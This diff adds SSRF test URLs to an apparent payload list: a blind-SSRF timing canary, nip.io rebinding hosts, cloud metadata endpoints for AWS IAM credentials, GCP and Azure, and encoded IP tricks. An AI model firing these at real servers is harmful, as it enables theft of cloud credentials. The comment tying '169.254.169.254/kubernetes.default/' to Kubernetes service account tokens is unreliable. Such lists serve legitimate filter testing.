@@ -47,3 +47,20 @@ http://127.0.0.1:8080/
 http://%31%32%37%2e%30%2e%30%2e%31/
 # Mixed case scheme
 HtTp://127.0.0.1/
+# Non-routable timing canary (blind SSRF signal)
+http://10.255.255.1:81/
+# DNS rebinding style via nip.io
+http://127.0.0.1.nip.io/
+http://0.0.0.0.nip.io/
+# Cloud metadata: AWS IAM credentials path
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Cloud metadata: GCP recursive
+http://metadata.google.internal/computeMetadata/v1/?recursive=true
+# Cloud metadata: Azure IMDS full
+http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
+# Kubernetes service account token
+http://169.254.169.254/kubernetes.default/
+# Decimal-encoded metadata IP
+http://2852039166/latest/meta-data/
+# 0x0.0.0.0 trick
+http://0x0.0.0.0/
